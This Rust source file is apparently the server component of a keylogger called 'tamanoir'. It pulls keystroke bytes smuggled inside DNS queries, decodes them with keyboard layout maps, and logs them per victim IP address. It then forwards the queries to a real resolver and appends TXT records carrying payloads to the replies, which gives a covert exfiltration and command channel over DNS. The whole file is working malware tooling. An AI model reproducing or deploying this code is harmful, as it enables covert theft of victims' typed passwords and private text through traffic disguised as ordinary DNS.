use std::{
    collections::HashMap,
    net::{Ipv4Addr, SocketAddr},
    sync::Arc,
};

use log::{debug, info, log_enabled, Level};
use tamanoir_common::ContinuationByte;
use tokio::{net::UdpSocket, sync::Mutex};

use crate::{
    KeyMap, Layout, Session, AR_COUNT_OFFSET, AR_HEADER_LEN, FOOTER_LEN, FOOTER_TXT, KEYMAPS,
};

pub fn max_payload_length(current_dns_packet_size: usize) -> usize {
    512usize
        .saturating_sub(current_dns_packet_size)
        .saturating_sub(FOOTER_LEN + AR_HEADER_LEN)
}
pub fn init_keymaps() {
    let mut map = HashMap::<u8, KeyMap>::new();
    map.insert(
        Layout::Azerty as u8,
        serde_yaml::from_str::<KeyMap>(include_str!("layouts/azerty.yml")).unwrap(),
    );
    map.insert(
        Layout::Qwerty as u8,
        serde_yaml::from_str::<KeyMap>(include_str!("layouts/qwerty.yml")).unwrap(),
    );
    KEYMAPS.set(map).expect("Error initializing KEYMAPS");
}

pub async fn mangle(
    data: &[u8],
    addr: SocketAddr,
    payload_len: usize,
    sessions: Arc<Mutex<HashMap<Ipv4Addr, Session>>>,
) -> Result<Vec<u8>, u32> {
    if data.len() <= payload_len {
        return Err(0u32);
    }
    let mut current_sessions: tokio::sync::MutexGuard<'_, HashMap<Ipv4Addr, Session>> =
        sessions.lock().await;
    let mut payload_it = data[data.len() - payload_len..].iter();

    let layout = Layout::from(*payload_it.next().ok_or(0u32)?); //first byte is layout
    let payload: Vec<u8> = payload_it.copied().collect();

    let mut data = data[..(data.len().saturating_sub(payload_len))].to_vec();
    //Add recursion bytes (DNS)
    data[2] = 1;
    data[3] = 32;

    let key_map = KEYMAPS
        .get()
        .ok_or(0u32)?
        .get(&(layout as u8))
        .ok_or(0u32)?;

    let session = Session::new(addr).ok_or(0u32)?;
    if let std::collections::hash_map::Entry::Vacant(e) = current_sessions.entry(session.ip) {
        info!("Adding new session for client: {} ", session.ip);
        e.insert(session.clone());
    }

    let current_session = current_sessions.get_mut(&session.ip).unwrap();

    for k in payload {
        if k != 0 {
            let last_key_code = current_session.key_codes.last();
            if key_map.is_modifier(last_key_code) {
                let _ = current_session.keys.pop();
            }
            let mapped_keys = key_map.get(&k, last_key_code);
            current_session.key_codes.push(k);
            current_session.keys.extend(mapped_keys)
        }
    }
    if !log_enabled!(Level::Debug) {
        print!("\x1B[2J\x1B[1;1H");

        std::io::Write::flush(&mut std::io::stdout()).unwrap();
    }
    for session in current_sessions.values() {
        info!("{}\n", session);
    }

    Ok(data)
}

pub async fn forward_req(data: Vec<u8>, dns_ip: Ipv4Addr) -> Result<Vec<u8>, u8> {
    debug!("Forwarding {} bytes", data.len());
    let sock = UdpSocket::bind("0.0.0.0:0").await.map_err(|_| 0u8)?;
    let remote_addr = format!("{}:53", dns_ip);
    sock.send_to(data.as_slice(), remote_addr)
        .await
        .map_err(|_| 0u8)?;
    let mut buf = vec![0u8; 512];
    let (len, _) = sock.recv_from(&mut buf).await.map_err(|_| 0u8)?;
    Ok(buf[..len].to_vec())
}

pub async fn add_info(
    data: &mut Vec<u8>,
    payload: &[u8],
    c_byte: ContinuationByte,
) -> Result<Vec<u8>, u8> {
    let mut n_ar = u16::from_be_bytes([data[AR_COUNT_OFFSET], data[AR_COUNT_OFFSET + 1]]);

    // we add a record
    n_ar += 1;
    let new_ar = n_ar.to_be_bytes();
    data[AR_COUNT_OFFSET] = new_ar[0];
    data[AR_COUNT_OFFSET + 1] = new_ar[1];

    let mut record = Vec::new();
    record.push(0u8); // no name
    record.extend_from_slice(&16u16.to_be_bytes()); // Type TXT
    record.extend_from_slice(&3u16.to_be_bytes()); // Class Chaos

    record.extend_from_slice(&300u32.to_be_bytes()); //TTL
    let payload_len = payload.len() as u16;
    let c_byte = c_byte as u8;

    let payload = [
        payload,
        FOOTER_TXT.as_bytes(),
        &[c_byte],
        &payload_len.to_le_bytes(),
    ]
    .concat();
    record.extend_from_slice(&((payload.len() + 1) as u16).to_be_bytes()); //Data Length
    record.push(payload.len() as u8); //TXT Length
    record.extend_from_slice(&payload); //TXT
    data.extend(record);
    Ok(data.clone())
}
